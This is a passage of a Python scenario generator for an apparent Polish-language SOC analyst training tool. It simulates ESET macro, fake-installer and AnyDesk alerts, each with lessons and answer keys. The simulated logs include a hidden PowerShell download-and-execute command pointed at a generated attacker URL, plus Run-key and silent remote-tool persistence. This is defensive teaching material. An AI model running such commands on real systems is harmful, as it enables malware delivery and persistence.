"""Scenarios that start from an ESET detection or a downloaded file."""

from __future__ import annotations

from hunterscope.trainer import sources as src
from hunterscope.trainer.model import Lessons
from hunterscope.trainer.scenarios.base import Builder, noise, template

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
EXCEL = r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"


# ======================================================================================================================
# ESET detection on a macro document
# ======================================================================================================================
LESSONS_MACRO = Lessons(
    title="Detekcja ESET na dokumencie z makrem",
    category="ESET / pliki",
    tp_signs=[
        "Nadawca z zewnątrz, SPF/DKIM/DMARC nie przechodzą (albo przechodzą dla domeny podobnej do firmowej), presja czasu w treści.",
        "Ta sama wiadomość trafiła do wielu pracowników: to kampania, nie pomyłka.",
        "Plik z Mark-of-the-Web, niepodpisane makra, sandbox pokazuje CreateObject/Shell/pobieranie.",
        "„Action taken: cleaned” nie kończy sprawy: sprawdź, czy dokument zdążył się otworzyć i co uruchomił (Excel/Word → cmd/powershell).",
    ],
    fp_signs=[
        "Nadawca wewnętrzny, plik znany od miesięcy i pobierany przez wiele osób bez incydentów.",
        "Makro podpisane certyfikatem firmowym, sandbox: tylko operacje na arkuszu i połączenie z firmowym SQL.",
        "Reputacja LiveGrid „rzadki” opisuje popularność, nie złośliwość: własne pliki firmy są zawsze „rzadkie”.",
        "Hash znany w TI/organizacji jako czysty.",
    ],
    checklist=[
        "Nazwa i typ detekcji, detektor (Email client / File system / Memory) oraz akcja: czy usunięto, czy tylko wykryto?",
        "Skąd plik: mail (nadawca, SPF/DKIM/DMARC, kto jeszcze dostał), pobranie, udział sieciowy?",
        "Czy dokument został otwarty i czy proces biurowy uruchomił potomka (cmd, powershell, wscript)?",
        "Zakładka Plik: podpis makra, MOTW, wynik sandboxa, popularność w organizacji.",
        "Hash i domena w TI.",
        "Ilu użytkowników dostało ten sam plik/mail? Czy trzeba je usunąć ze skrzynek?",
        "Czy FP wymaga przywrócenia pliku i wyjątku w ESET?",
    ],
    pitfalls=[
        "„Cleaned by deletion” wygląda uspokajająco, ale zwalnia z myślenia dopiero wtedy, gdy nic się nie uruchomiło.",
        "Rzadki w LiveGrid ≠ złośliwy. Nowa wiadomość od obcego nadawcy to co innego niż stary plik wewnętrzny.",
        "Symulacja phishingu też jest „złośliwym mailem”. Sprawdź kalendarz kampanii, zanim zaczniesz IR.",
    ],
    attack=["T1566.001 Phishing: Spearphishing Attachment", "T1204.002 User Execution: Malicious File",
            "T1059.005 Visual Basic", "T1105 Ingress Tool Transfer"],
    tips=[
        "ESET PROTECT: Detections → szczegóły: kolumny Process name i Detector mówią, na którym etapie złapano zagrożenie.",
        "ESET PROTECT: Quarantine → Restore + Create exclusion po hashu (nie po ścieżce), gdy to potwierdzone FP.",
        "Brama pocztowa: wyszukaj po temacie/nadawcy/hashu załącznika, żeby policzyć odbiorców i usunąć wiadomość (purge).",
    ],
    hints=[
        "Zobacz, skąd przyszedł plik i kto jeszcze go dostał.",
        "Sprawdź w zakładce Plik podpis makra i wynik sandboxa oraz czy dokument zdążył coś uruchomić.",
        "Zweryfikuj hash i domenę w TI oraz kalendarz zmian (czy trwa kampania szkoleniowa?).",
    ],
)


@template("office_macro", ("tp", "fp", "btp"), LESSONS_MACRO)
def office_macro(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    b.at_hour(rng.choice([9, 10, 11, 13, 14]))
    p = b.person(rng.choice(["Księgowość", "Logistyka", "Sprzedaż"]))
    sess = b.session(p)
    folder = rf"{p.profile}\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\{rng.randint(1000, 9999)}QX"
    if variant == "tp":
        sender_dom = b.threat(site_only=True).name
        sender, att = f"zamowienia@{sender_dom}", "Zamowienie_8841.xlsm"
        obj = rf"{folder}\{att}"
        sha1, sha256 = w.digest("macro1", "sha1"), w.digest("macro1")
        remote = b.threat()
        domain, ip = remote.name, w.attacker_ip()
        mail_ip = w.attacker_ip()
        others = [w.person() for _ in range(3)]
        auth = {"spf": "fail", "dkim": "none", "dmarc": "fail"} if not b.hard else {"spf": "pass", "dkim": "pass", "dmarc": "pass"}
        for i, r in enumerate([p, *others]):
            ev = b.add(src.mail(b.t(-25, i * 7), sender, r.upn, "Zamówienie nr 8841/2026: prośba o potwierdzenie", att,
                                sender_ip=mail_ip, **auth))
            ev.key("Wiadomość z zewnętrznej domeny z załącznikiem .xlsm, presja na szybkie potwierdzenie. "
                   + ("SPF/DKIM/DMARC nie przechodzą." if not b.hard else "Uwierzytelnienie przechodzi, bo atakujący kontroluje domenę. To nie dowód zaufania.")
                   if i == 0 else "Ta sama wiadomość trafiła do innych pracowników. Kampania: trzeba ich znaleźć i usunąć wiadomość ze skrzynek.")
        executed = b.hard
        if executed:
            _, xl = b.spawn(sess["outlook"], EXCEL, f'"EXCEL.EXE" "{obj}"', b.t(-4), p.host, p.sam, signer="Microsoft Corporation", cwd=p.profile)
            ev, cmd = b.spawn(xl, CMD, r'cmd.exe /c powershell.exe -w hidden -c "iwr ' + remote.url("s.bin") + r' -OutFile $env:TEMP\svc.exe; & $env:TEMP\svc.exe"',
                              b.t(-3), p.host, p.sam)
            ev.key("EXCEL.EXE uruchamia cmd.exe z poleceniem pobrania i uruchomienia pliku. Makro się wykonało, zanim ESET zareagował.")
            _, ps = b.spawn(cmd, PS, r'powershell.exe -w hidden -c "iwr ' + remote.url("s.bin") + r' -OutFile $env:TEMP\svc.exe"',
                            b.t(-3, 1), p.host, p.sam)
            b.add(src.sysmon_net(b.t(-2.8), p.host, p.netbios, PS, ps.pid, ip, 443, domain, src_ip=p.ip)).key(
                f"powershell.exe łączy się z {domain} ({remote.blurb}). Etap pobierania już się odbył.")
            dropped = rf"{p.profile}\AppData\Local\Temp\svc.exe"
            b.add(src.sysmon_file(b.t(-2.5), p.host, p.netbios, PS, ps.pid, dropped, size="318 KB")).key("Na dysku pojawił się nieznany plik wykonywalny.")
            b.add(src.sysmon_reg(b.t(-1.5), p.host, p.netbios, dropped, r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\SvcUpdate",
                                 dropped)).key("Wpis autostartu: persystencja ustanowiona, zanim ESET usunął plik.")
            trigger = b.add(src.eset(b.t(0), p.host, p.netbios, "Win32/TrojanDownloader.Agent.GEO trojan", "trojan", "file", dropped, sha1,
                                     "cleaned by deletion", True, "svc.exe", "Real-time file system protection", reputation="Bad", popularity="Rare"))
            trigger.key("ESET usunął dropper, ale wpis w Run i połączenie sieciowe pokazują, że infekcja już się zadziała. „Handled: Yes” nie znaczy „host czysty”.")
        else:
            trigger = b.add(src.eset(b.t(0), p.host, p.netbios, "VBA/TrojanDownloader.Agent.AQX trojan", "trojan", "file", obj, sha1,
                                     "cleaned by deletion", True, "OUTLOOK.EXE", "Email client protection", reputation="Bad", popularity="Rare"))
            trigger.key("ESET usunął załącznik przy zapisie przez Outlook, zanim ktokolwiek go otworzył. Brak procesów potomnych Excela.")
        b.ti_threat(remote, ip=ip, tags="downloader")
        b.ti_bad(sender_dom, "domena", age_days=3, tags="phishing")
        b.ti_bad(sha256, "hash", age_days=1, tags="VBA downloader")
        file = {
            "name": att, "path": obj, "size": "86 KB", "sha256": sha256, "type": "Excel z makrami (xlsm)",
            "signature": "Brak podpisu makra", "mark_of_the_web": f"ZoneId=3, pochodzi z załącznika e-mail od {sender}",
            "org_prevalence": "Widziany na 4 hostach (wszystkie wiadomości z tej kampanii)",
            "sandbox_verdict": "Złośliwy (9/10)",
            "behaviors": ["Makro Auto_Open wywołuje CreateObject(\"WScript.Shell\")", "Uruchamia cmd.exe → powershell.exe -w hidden",
                          f"Pobiera plik z {remote.url('s.bin')}", "Dodaje wpis do klucza Run"],
        }
        n = len(others) + 1
        extra = "Dokument zdążył się wykonać (wersja 'escaped'), więc to infekcja do izolacji." if executed else "Plik usunięty przed otwarciem, ale wiadomość dostało jeszcze " + str(len(others)) + " osób."
        req = ["escalate_l2", "isolate_host", "block_ioc", "hunt_org", "notify_user"] if executed else ["block_ioc", "hunt_org", "notify_user"]
        truth = b.truth(
            "tp", "high" if executed else "medium",
            f"Kampania phishingowa z załącznikiem {att} do {n} pracowników. {extra}",
            f"TP. Mail od {sender} ({'SPF fail' if not b.hard else 'SPF pass, domena atakującego'}) z {att} do {n} osób. ESET: {trigger.fields['Detection']}, "
            f"{trigger.fields['Action taken']}. " + (f"Excel uruchomił cmd/powershell, pobranie z {domain}, wpis Run: eskaluję, wnoszę o izolację {p.host}, blokadę {domain}, purge wiadomości."
                                                       if executed else f"Dokument nie został otwarty (brak procesów potomnych). Wnoszę o blokadę {sender_dom}, purge wiadomości u pozostałych odbiorców, informuję użytkownika."),
            required=req, drop=() if executed else ("escalate_l2",), allow=() if executed else ("close", "close_tune"), lookups=[f"ti:{domain if executed else sender_dom}"])
    elif variant == "fp":
        owner = w.person("Księgowość")
        att = "Budzet_2026_v3.xlsm"
        obj = rf"{folder}\{att}"
        sha1, sha256 = w.digest("budget", "sha1"), w.digest("budget")
        b.add(src.mail(b.t(-30), owner.upn, p.upn, "Budżet 2026 v3 do akceptacji", att, sender_ip="10.10.30.30")).key(
            f"Nadawca wewnętrzny ({owner.display}, ten sam dział), uwierzytelnienie poprawne, kontekst pasuje do pracy użytkownika.")
        trigger = b.add(src.eset(b.t(0), p.host, p.netbios, "VBA/TrojanDownloader.Agent.AQX trojan", "trojan", "file", obj, sha1,
                                 "cleaned by deletion", True, "OUTLOOK.EXE", "Email client protection", reputation="Unknown", popularity="Rare"))
        trigger.herring("Nazwa detekcji brzmi groźnie, a LiveGrid mówi „rzadki”. Własny plik firmy jest rzadki z definicji, to nie ocena złośliwości.")
        for d in (14, 30, 55):
            u = w.person("Księgowość")
            b.add(src.m365(b.t(-d * 1440), u.upn, "FileDownloaded", w.office_nat_ip(),
                           details={"ObjectId": f"https://nordwind.sharepoint.example/Finanse/{att}", "SiteUrl": "Finanse"})).key(
                "Ten sam plik pobierany przez wiele osób przez tygodnie bez incydentów. To działający arkusz budżetowy.")
        b.ti_good(sha256, "hash", owner="Dział Finansów (plik wewnętrzny)", age_years=1, hosts_seen=31,
                  note="Plik wewnętrzny, makra podpisane certyfikatem firmowym. Wcześniejsze detekcje ESET to FP po aktualizacji sygnatur.")
        noise(b, involved=[p])
        file = {
            "name": att, "path": obj, "size": "412 KB", "sha256": sha256, "type": "Excel z makrami (xlsm)",
            "signature": "Makro podpisane: „Nordwind Finance Macro Signing” (wewnętrzny CA), certyfikat ważny",
            "mark_of_the_web": "ZoneId=1 (intranet / zaufana lokalizacja SharePoint)",
            "org_prevalence": "Widziany na 31 hostach przez ostatnie 14 miesięcy",
            "sandbox_verdict": "Nieszkodliwy (0/10)",
            "behaviors": ["Makro formatuje arkusze i przelicza scenariusze", "Połączenie ODBC z SRV-SQL01 (baza kontrolingu)",
                          "Brak uruchamiania procesów zewnętrznych, brak ruchu do internetu"],
        }
        truth = b.truth(
            "fp", "low",
            "ESET zaklasyfikował heurystycznie firmowy arkusz budżetowy z podpisanymi makrami jako downloader. Plik jest znany, używany przez 31 stacji, wysłany przez "
            "pracownika działu, makro podpisane certyfikatem firmowym. Skutek: użytkownik stracił plik (usunięty).",
            f"FP. {p.host}: ESET usunął Budzet_2026_v3.xlsm (heurystyka VBA). Nadawca wewnętrzny {owner.sam}, makro podpisane certyfikatem Nordwind Finance, hash znany "
            "na 31 hostach, sandbox: ODBC do SRV-SQL01, brak procesów i ruchu zewnętrznego. Przywracam z kwarantanny i dodaję wyjątek po hashu, zgłaszam FP do ESET.",
            required=["eset_exception"], harmful=["block_ioc", "hunt_org"], lookups=[f"ti:{sha256}"])
    else:
        att = "Zaleglosc_faktura_0426.xlsm"
        obj = rf"{folder}\{att}"
        sha1, sha256 = w.digest("phishsim", "sha1"), w.digest("phishsim")
        sim_dom = "nordwind-faktury-info.example"
        extra = {"X-Campaign-ID": "AWARENESS-Q1-2026", "X-Mailer": "AwarenessPlatform"}
        for i, r in enumerate([p, *[w.person() for _ in range(5)]]):
            b.add(src.mail(b.t(-12, i), f"faktury@{sim_dom}", r.upn, "Pilne: zaległa faktura, otwórz załącznik", att, sender_ip=w.public_ip(),
                           extra=extra)).key(
                "Wygląda jak phishing (obca domena, presja czasu, makro), ale nagłówek X-Campaign-ID wskazuje platformę szkoleniową. Porównaj z kalendarzem kampanii." if i == 0
                else "Ta sama wiadomość z tym samym nagłówkiem kampanii do wielu osób w kilka minut: to masowa wysyłka szkoleniowa.")
        trigger = b.add(src.eset(b.t(0), p.host, p.netbios, "VBA/Agent.PSX potentially unsafe application", "potentially unsafe", "file", obj, sha1,
                                 "cleaned by deletion", True, "OUTLOOK.EXE", "Email client protection", reputation="Unknown", popularity="Rare"))
        trigger.herring("ESET słusznie wykrywa makro, ale to dokument symulacji phishingu (makro pokazuje komunikat edukacyjny).")
        b.ctx.ti[sim_dom] = {
            "Wskaźnik": sim_dom, "Typ": "domena", "Werdykt TI (symulacja)": "Brak danych publicznych", "Pierwszy raz widziany": "40 dni temu",
            "Występowanie w organizacji": "6 skrzynek w ostatnich 24 h", "Tagi": "-",
            "Komentarz": "Wpis wewnętrzny Działu Bezpieczeństwa: domena infrastruktury kampanii szkoleniowej AWARENESS-Q1-2026.",
        }
        b.change("*", b.t(-60), b.t(180), "Kampania szkoleniowa phishing (symulacja) AWARENESS-Q1-2026, nadawca nordwind-faktury-info.example", "SEC-2026-014")
        noise(b, involved=[p])
        file = {
            "name": att, "path": obj, "size": "58 KB", "sha256": sha256, "type": "Excel z makrami (xlsm)", "signature": "Brak podpisu makra",
            "mark_of_the_web": "ZoneId=3, załącznik e-mail", "org_prevalence": "Widziany na 6 hostach (dziś)",
            "sandbox_verdict": "Nieszkodliwy (symulacja szkoleniowa)",
            "behaviors": ["Makro wyświetla okno „To była symulacja phishingu”", "Wysyła żądanie HTTP do platformy szkoleniowej (zliczenie otwarcia)"],
        }
        truth = b.truth(
            "btp", "info",
            "Detekcja jest zasadna (makro z obcej domeny), ale to dokument z autoryzowanej kampanii szkoleniowej AWARENESS-Q1-2026. Nagłówki X-Campaign-ID i kalendarz zmian to potwierdzają.",
            f"BTP. {p.host}: ESET usunął {att} (makro) z maila od faktury@{sim_dom}. Nagłówek X-Campaign-ID: AWARENESS-Q1-2026, wpis SEC-2026-014 w kalendarzu, "
            "ten sam mail do 6 osób. Symulacja phishingu, nie incydent. Zamykam bez eskalacji (odnotowuję, że plik nie został otwarty).",
            lookups=[f"change:{p.host}", f"ti:{sim_dom}"])
    b.finish(trigger, source="ESET PROTECT", rule=f"Detection: {trigger.fields['Detection']}", severity="high",
             description=f"ESET wykrył zagrożenie na hoście {p.host}: {trigger.fields['Detection']}.", truth=truth, lessons=LESSONS_MACRO, file=file)


# ======================================================================================================================
# Downloaded executable
# ======================================================================================================================
LESSONS_DOWNLOAD = Lessons(
    title="Pobrany plik wykonywalny spoza białej listy",
    category="ESET / pliki",
    tp_signs=[
        "Domena podszywa się pod producenta (typosquatting) i jest świeża, plik ma niską popularność w organizacji.",
        "Brak podpisu albo podpis innego, nieznanego wydawcy niż oczekiwany producent.",
        "Po uruchomieniu instalator odpala cmd/powershell, zapisuje pliki w AppData i łączy się z internetem.",
        "Sandbox/VT: wiele detekcji lub zachowanie dropper'a.",
    ],
    fp_signs=[
        "Oficjalna domena dostawcy, plik podpisany właściwym wydawcą, wysoka popularność w organizacji.",
        "Pobiera osoba, która z racji roli instaluje takie oprogramowanie (IT), a program jest na liście zatwierdzonej.",
        "Brak podejrzanych procesów potomnych i ruchu poza domeny dostawcy.",
    ],
    checklist=[
        "Skąd dokładnie pobrano (URL, referer z MOTW) i czy domena jest oficjalna czy podobna do oficjalnej?",
        "Zakładka Plik: podpis (kto jest wydawcą), wiek, popularność, wynik sandboxa/VT.",
        "Czy plik został uruchomiony? Jakie procesy i połączenia powstały potem?",
        "Rola użytkownika i polityka: czy ten program jest zatwierdzony? Czy użytkownik ma prawo go instalować?",
        "Domena i hash w TI (wiek rejestracji, popularność).",
    ],
    pitfalls=[
        "Dobry podpis cyfrowy to nie koniec: sprawdź KTO podpisał. Atakujący też kupują certyfikaty.",
        "Legalny program nie zawsze jest dozwolony. To naruszenie polityki (BTP), nie atak (TP).",
        "Brak detekcji w VT dla świeżego pliku nie jest dowodem czystości.",
    ],
    attack=["T1189 Drive-by Compromise", "T1204.002 User Execution: Malicious File", "T1036 Masquerading"],
    tips=[
        "Proxy: zobacz referer i kategorię domeny; w SIEM wyszukaj inne hosty, które łączyły się z tą domeną.",
        "Właściwości pliku → Podpisy cyfrowe: kto jest wydawcą, czy łańcuch jest zaufany.",
        "ESET LiveGrid pokazuje popularność i reputację hasha. „Rzadki + nieznany” to powód do ostrożności, nie dowód.",
    ],
    hints=[
        "Zobacz zakładkę Plik: kto go podpisał i skąd został pobrany?",
        "Sprawdź, czy domena jest oficjalna dostawcy, i co zrobił plik po uruchomieniu.",
        "Zweryfikuj w Kontekście rolę użytkownika, listę zatwierdzonego oprogramowania i reputację domeny/hasha.",
    ],
)


@template("downloaded_file", ("tp", "fp", "btp"), LESSONS_DOWNLOAD)
def downloaded_file(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    b.at_hour(rng.choice([9, 10, 11, 13, 14, 15]))
    if variant == "tp":
        p = b.person(rng.choice(["Marketing", "Sprzedaż", "HR"]))
        sess = b.session(p)
        remote = b.threat(site_only=True, brand="7zip")
        domain, ip = remote.name, w.attacker_ip()
        fname = "7z2301-x64.exe"
        url = remote.url(f"download/{fname}")
        path = rf"{p.profile}\Downloads\{fname}"
        sha256 = w.digest("fake7z")
        b.add(src.proxy(b.t(-3), p.ip, p.sam, "GET", "https://www.google.com/search?q=7zip+download", 200, 600, 84_000, host=p.host))
        trigger = b.add(src.proxy(b.t(-2), p.ip, p.sam, "GET", url, 200, 520, 1_840_000, category=remote.category, host=p.host,
                                  content_type="application/x-msdownload"))
        trigger.key(f"Pobranie .exe z domeny {domain}: nazwa udaje 7-Zip, ale to nie oficjalna strona producenta ({remote.blurb}). "
                    "Kategoria i wiek domeny mogą wyglądać niewinnie: liczy się, że nie jest to domena producenta.")
        b.add(src.sysmon_file(b.t(-1.9), p.host, p.netbios, CHROME, sess["chrome"].pid, path, size="1.8 MB"))
        b.add(src.sysmon_motw(b.t(-1.9, 1), p.host, p.netbios, path, url, referrer="https://www.google.com/")).key(
            "Mark-of-the-Web: plik pochodzi z Internetu (strefa 3), z wyniku wyszukiwania. Typowa reklama prowadząca do fałszywej strony.")
        signer = "Fast Soft Ltd" if b.hard else ""
        ev, inst = b.spawn(sess["explorer"], path, f'"{path}"', b.t(0), p.host, p.sam, signed="Yes" if b.hard else "No",
                           signer=signer, sha256=sha256, cwd=rf"{p.profile}\Downloads")
        ev.key("Instalator uruchomiony. " + ("Podpisany przez „Fast Soft Ltd”, a nie przez wydawcę 7-Zip: ważny podpis nieznanego wydawcy." if b.hard else "Brak podpisu cyfrowego, a prawdziwy instalator 7-Zip jest podpisany."))
        ev2, ch = b.spawn(inst, CMD, rf'cmd.exe /c start /min "" "{p.profile}\AppData\Roaming\svc.exe"', b.t(0, 8), p.host, p.sam)
        ev2.key("Instalator odpala cmd.exe i uruchamia plik z AppData\\Roaming. Prawdziwy instalator tak nie robi.")
        b.add(src.sysmon_file(b.t(0, 6), p.host, p.netbios, path, inst.pid, rf"{p.profile}\AppData\Roaming\svc.exe", size="318 KB")).key(
            "Dropper zapisuje ukryty plik w profilu użytkownika.")
        b.add(src.sysmon_net(b.t(0, 20), p.host, p.netbios, rf"{p.profile}\AppData\Roaming\svc.exe", w.pid(), ip, 443, domain, src_ip=p.ip)).key(
            "Zrzucony plik łączy się z internetem.")
        b.ti_threat(remote, ip=ip, tags="typosquatting, malware delivery")
        b.ti_bad(sha256, "hash", age_days=1, tags="dropper")
        file = {
            "name": fname, "path": path, "size": "1.8 MB", "sha256": sha256, "type": "PE32+ (instalator)",
            "signature": ("Ważny podpis: Fast Soft Ltd" if b.hard else "Brak podpisu cyfrowego"),
            "mark_of_the_web": f"ZoneId=3, HostUrl={url}", "org_prevalence": "Widziany na 1 hoście",
            "sandbox_verdict": "Złośliwy" if not b.hard else "Podejrzany",
            "behaviors": [r"Zapisuje svc.exe w %APPDATA%\Roaming", "Uruchamia cmd.exe /c start", f"Łączy się z {domain}:443"],
        }
        truth = b.truth(
            "tp", "high",
            f"Użytkownik szukał 7-Zip i trafił na fałszywą stronę {domain}. Pobrany instalator jest niepodpisany (lub podpisany przez nieznanego wydawcę), zrzuca svc.exe do AppData i łączy się z internetem.",
            f"TP. {p.host} ({p.sam}) pobrał {fname} z {domain} (typosquatting). Instalator zrzucił i uruchomił %APPDATA%\\Roaming\\svc.exe, połączenie do {ip}:443. "
            "Eskaluję do L2, wnoszę o izolację hosta i blokadę domeny i hasha.",
            required=["isolate_host", "block_ioc"], lookups=[f"ti:{domain}"])
        rule = "Executable downloaded from a domain outside the software whitelist"
    else:
        dept = "IT" if variant == "fp" else rng.choice(["Sprzedaż", "Marketing", "HR"])
        p = b.person(dept)
        sess = b.session(p)
        if variant == "fp":
            domain, fname = "update.code.visualstudio.com", "VSCodeUserSetup-x64-1.87.2.exe"
            url = f"https://{domain}/1.87.2/win32-x64-user/stable"
            signer, owner, sha256 = "Microsoft Corporation", "Microsoft Corporation", w.digest("vscode")
            b.ctx.assets[p.host.lower()]["Uwagi"] = "Zatwierdzone oprogramowanie: Visual Studio Code (lista IT, kategoria narzędzia deweloperskie)"
        else:
            domain, fname = "zoom.us", "ZoomInstaller.exe"
            url = f"https://{domain}/client/latest/ZoomInstaller.exe"
            signer, owner, sha256 = "Zoom Video Communications, Inc.", "Zoom Video Communications", w.digest("zoom")
            b.ctx.assets[p.host.lower()]["Uwagi"] = "Polityka: komunikator firmowy to Teams. Zoom NIE jest na liście zatwierdzonego oprogramowania"
        path = rf"{p.profile}\Downloads\{fname}"
        trigger = b.add(src.proxy(b.t(-2), p.ip, p.sam, "GET", url, 200, 480, 3_200_000, category="Software Downloads", host=p.host,
                                  content_type="application/x-msdownload"))
        trigger.herring("Pobranie pliku .exe spoza białej listy to powód alertu, ale domena jest oficjalna i stara.")
        b.add(src.sysmon_file(b.t(-1.9), p.host, p.netbios, CHROME, sess["chrome"].pid, path, size="3.2 MB"))
        b.add(src.sysmon_motw(b.t(-1.9, 1), p.host, p.netbios, path, url, referrer=f"https://{domain}/")).key(
            "Pobrane z oficjalnej strony dostawcy (referer z tej samej domeny).")
        ev, inst = b.spawn(sess["explorer"], path, f'"{path}"', b.t(0), p.host, p.sam, signer=signer, sha256=sha256, cwd=rf"{p.profile}\Downloads")
        ev.key(f"Plik podpisany przez {signer}: właściwy wydawca dla tego produktu, ważny podpis.")
        b.spawn(inst, r"C:\Windows\System32\msiexec.exe" if variant == "fp" else path, "setup /silent", b.t(0, 20), p.host, p.sam, signer=signer, sha256=sha256)
        b.events[-1].key("Dalsze procesy to elementy instalatora, bez cmd/powershell i bez dziwnych ścieżek.")
        b.ti_good(domain, "domena", owner=owner, hosts_seen=45 if variant == "fp" else 12)
        b.ti_good(sha256, "hash", owner=owner, age_years=1, hosts_seen=45 if variant == "fp" else 12)
        file = {
            "name": fname, "path": path, "size": "3.2 MB", "sha256": sha256, "type": "PE32 (instalator)",
            "signature": f"Ważny podpis: {signer}", "mark_of_the_web": f"ZoneId=3, HostUrl={url}",
            "org_prevalence": ("Widziany na 45 hostach" if variant == "fp" else "Widziany na 12 hostach"),
            "sandbox_verdict": "Nieszkodliwy", "behaviors": ["Standardowa instalacja aplikacji w profilu użytkownika", "Ruch tylko do domen dostawcy"],
        }
        if variant == "fp":
            truth = b.truth(
                "fp", "info",
                "Pracownik IT pobrał instalator Visual Studio Code z oficjalnej domeny Microsoftu. Plik jest podpisany przez Microsoft Corporation, znany na 45 hostach, program na liście zatwierdzonej.",
                f"FP. {p.host} ({p.sam}, IT) pobrał VSCodeUserSetup z update.code.visualstudio.com, podpis Microsoft Corporation, popularność 45 hostów, VS Code na liście zatwierdzonej. "
                "Zamykam jako FP, wnoszę o dodanie domeny do białej listy.",
                lookups=[f"ti:{domain}", f"asset:{p.host}"])
        else:
            truth = b.truth(
                "btp", "low",
                "Plik jest legalny (oficjalny instalator Zoom, ważny podpis), więc nie ma tu malware. Ale Zoom nie jest zatwierdzonym oprogramowaniem, a użytkownik spoza IT zainstalował go sam. To naruszenie polityki.",
                f"BTP. {p.host} ({p.sam}, {p.dept}) zainstalował ZoomInstaller.exe z zoom.us, podpis poprawny, brak podejrzanych zachowań. Zoom nie jest na liście zatwierdzonej. "
                "Zamykam jako incydent bez złośliwej aktywności, informuję użytkownika o polityce i zgłaszam do IT, bez izolacji hosta.",
                required=["notify_user"], lookups=[f"asset:{p.host}"])
        rule = "Executable downloaded from a domain outside the software whitelist"
    noise(b, involved=[p])
    b.finish(trigger, source="SIEM", rule=rule, severity="medium", description=f"Użytkownik {p.sam} pobrał plik wykonywalny z domeny spoza białej listy.",
             truth=truth, lessons=LESSONS_DOWNLOAD, file=file)


# ======================================================================================================================
# Remote administration tool
# ======================================================================================================================
LESSONS_REMOTE = Lessons(
    title="Narzędzie zdalnego dostępu (AnyDesk)",
    category="ESET / pliki",
    tp_signs=[
        "Instalujący to użytkownik spoza IT (np. księgowość), zwykle po telefonie od „banku / supportu”.",
        "Pobranie z fałszywej strony, instalacja z hasłem do dostępu nienadzorowanego (unattended).",
        "Sesja trwa kilkadziesiąt minut (duży ruch przychodzący na relay), w tym czasie otwierana jest bankowość lub poczta.",
        "Brak zgłoszenia w helpdesku, brak wpisu w kalendarzu zmian.",
    ],
    fp_signs=[
        "Host z działu IT / helpdesk, narzędzie z firmowej licencji i na liście zatwierdzonej.",
        "Plik w Program Files, podpisany przez właściwego wydawcę.",
        "Aktywna sesja pokrywa się ze zgłoszeniem w helpdesku.",
    ],
    checklist=[
        "Kim jest użytkownik, czy jego rola obejmuje zdalną pomoc?",
        "Skąd narzędzie (oficjalna strona czy fałszywa), ścieżka, podpis.",
        "Czy ustawiono dostęp nienadzorowany (system.conf, hasło)?",
        "Czas i wielkość ruchu do relay: czy była sesja zdalna i jak długo?",
        "Co robiono podczas sesji (przeglądarka, bankowość, cmd)?",
        "Zgłoszenie w helpdesku, lista zatwierdzonego oprogramowania, kalendarz.",
    ],
    pitfalls=[
        "Narzędzie jest legalne i podpisane, dlatego ESET klasyfikuje je tylko jako PUA. Złośliwy jest sposób użycia, nie plik.",
        "Nie zamykaj jako „PUA, nic groźnego”, zanim sprawdzisz, czy ktoś zdalnie steruje komputerem.",
    ],
    attack=["T1219 Remote Access Software", "T1566.004 Phishing: Spearphishing Voice", "T1078 Valid Accounts"],
    tips=[
        "ESET PROTECT: Detections → PUA. Polityka „Detect unsafe applications” może wymagać wyjątku dla zatwierdzonych narzędzi IT.",
        "Szukaj na innych hostach: AnyDesk.exe, TeamViewer.exe, ScreenConnect (hash i ścieżka).",
        "Przy podejrzeniu oszustwa „na pracownika bankowego”: natychmiast telefon do użytkownika i do banku.",
    ],
    hints=[
        "Kim jest użytkownik i czy rola tłumaczy użycie takiego narzędzia?",
        "Zobacz, skąd pochodzi plik, czy ustawiono dostęp nienadzorowany i co działo się w czasie sesji.",
        "Sprawdź w Kontekście listę zatwierdzonego oprogramowania i wpisy w helpdesku.",
    ],
)


@template("remote_tool", ("tp", "btp"), LESSONS_REMOTE)
def remote_tool(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    exe_pf = r"C:\Program Files (x86)\AnyDesk\AnyDesk.exe"
    sha256, sha1 = w.digest("anydesk"), w.digest("anydesk", "sha1")
    relay = "relay-4f1c9a2e.net.anydesk.com"
    relay_ip = w.service_ip()
    if variant == "tp":
        b.at_hour(rng.choice([16, 17, 18]))
        p = b.person("Księgowość")
        b.ctx.assets[p.host.lower()]["Uwagi"] = "Stanowisko z dostępem do bankowości elektronicznej (token + hasło)"
        sess = b.session(p)
        remote = b.threat(site_only=True, brand="anydesk")
        domain = remote.name
        path = rf"{p.profile}\Downloads\AnyDesk.exe"
        url = remote.url("AnyDesk.exe")
        b.add(src.proxy(b.t(-22), p.ip, p.sam, "GET", url, 200, 500, 3_900_000, category=remote.category, host=p.host,
                        content_type="application/x-msdownload")).key(
            f"AnyDesk pobrany z domeny {domain} ({remote.blurb}), a nie z oficjalnej strony producenta. Tak działają oszuści podszywający się pod „support”.")
        b.add(src.sysmon_motw(b.t(-21.9), p.host, p.netbios, path, url, referrer="https://mail.example/"))
        ev, ad = b.spawn(sess["explorer"], path, f'"{path}"', b.t(-20), p.host, p.sam, signer="AnyDesk Software GmbH", sha256=sha256,
                         cwd=rf"{p.profile}\Downloads")
        ev.key("Użytkownik z księgowości uruchamia narzędzie do zdalnego sterowania. To nie jest jej rola.")
        ev, _ = b.spawn(ad, exe_pf, rf'"{exe_pf}" --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent', b.t(-19), p.host,
                        p.sam, signer="AnyDesk Software GmbH", sha256=sha256, integrity="High")
        ev.key("Instalacja z autostartem (--start-with-win): narzędzie pozostanie na stałe.")
        b.add(src.sysmon_file(b.t(-18.5), p.host, "NT AUTHORITY\\SYSTEM", exe_pf, ad.pid, r"C:\ProgramData\AnyDesk\system.conf")).key(
            "system.conf z ustawionym hasłem do dostępu nienadzorowanego (ad.anynet.pwd_hash): atakujący może wejść w dowolnym momencie.")
        for i in range(0, 36, 6):
            b.add(src.fw(b.t(-18 + i), "allow", "tcp", p.ip, rng.randint(49152, 60000), relay_ip, 443, bytes_out=rng.randint(200_000, 500_000),
